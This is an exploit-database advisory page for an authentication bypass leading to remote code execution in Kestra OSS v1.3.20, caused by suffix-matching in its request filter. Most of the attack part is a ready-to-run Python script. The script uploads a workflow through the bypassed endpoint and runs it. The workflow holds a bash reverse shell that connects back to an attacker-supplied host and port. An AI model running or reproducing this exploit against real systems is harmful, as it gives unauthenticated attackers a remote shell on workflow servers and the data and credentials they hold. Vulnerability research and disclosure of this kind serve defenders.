---
title: Kestra OSS Authentication Bypass Remote Code Execution v1.3.20
url: https://cxsecurity.com/issue/WLB-2026100006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-10-20
fetch_date: 2026-10-21T06:46:57.828343
---

# Kestra OSS Authentication Bypass Remote Code Execution v1.3.20

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Kestra OSS Authentication Bypass Remote Code Execution v1.3.20** **2026.10.20**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-49869](https://cxsecurity.com/cveshow/CVE-2026-49869/ "Click to see CVE-2026-49869")**  CWE: **N/A** | |

# Title: Kestra OSS Authentication Bypass Remote Code Execution (CVE-2026-49869) v1.3.20
# Author: nu11secur1ty
# Date: 10.05.2026
# Vendor: Kestra
# Software: Kestra OSS
# Reference: https://github.com/kestra-io/kestra
## Description:
CVE-2026-49869 is a critical authentication bypass vulnerability residing within Kestra OSS's core request-filtering mechanism (`AuthenticationFilter`). Due to insecure suffix-matching logic (`endsWith("/configs")`) instead of strict routing or exact segment validation, attackers can craft custom request paths that bypass security controls. This allows unauthenticated remote attackers to create, modify, and execute arbitrary workflows (`flows`) containing execution plugins (such as `io.kestra.plugin.scripts.shell.Commands`), leading to full Remote Code Execution (RCE) with high privileges on the hosting environment.
STATUS: Vulnerable / PoC Verified
[+]Payload:
```python
#!/usr/bin/python
# Tool/Model: nu11secur1ty
from argparse import ArgumentParser
from ipaddress import IPv4Address
from urllib.parse import urlsplit
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError
# Parse command line arguments
parser = ArgumentParser()
parser.add\_argument("target")
parser.add\_argument("--lhost", type=IPv4Address, required=True)
parser.add\_argument("--lport", type=int, required=True)
args = parser.parse\_args()
# Validate target URL format
target = urlsplit(args.target)
if target.scheme not in ("http", "https") or not target.netloc or target.path not in ("", "/") or target.query or target.fragment:
parser.error("target must be a base HTTP URL")
if not 1 <= args.lport <= 65535:
parser.error("lport must be between 1 and 65535")
base = args.target.rstrip("/") + "/api/v1/main"
# Define malicious flow payload containing a bash reverse shell
flow = f"""id: configs
namespace: configs
tasks:
- id: shell
type: io.kestra.plugin.scripts.shell.Commands
taskRunner:
type: io.kestra.plugin.core.runner.Process
commands:
- "bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'"
"""
try:
# Upload the flow configuration utilizing the auth bypass
req\_flow = Request(
f"{base}/flows/configs?delete=false",
data=flow.encode(),
headers={"Content-Type": "application/x-yaml"}
)
urlopen(req\_flow, timeout=10).close()
print("[+] Flow uploaded successfully.")
# Trigger the flow execution
req\_exec = Request(f"{base}/executions/configs/configs", method="POST")
response = urlopen(req\_exec, timeout=10).read().decode()
print("[+] Execution triggered successfully:")
print(response)
except HTTPError as e:
print(f"[-] HTTP Error: {e.code} - {e.reason}")
except URLError as e:
print(f"[-] Network Error: {e.reason}")
except Exception as e:
print(f"[-] An unexpected error occurred: {e}")
# Reproduce:
[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2026/CVE-2026-49869)
# Demo:
[href](https://odysee.com/@nu11secur1ty:b/CVE-2026-49869-RCE-exploit:a)
# Time spent:
01:35:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026100006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top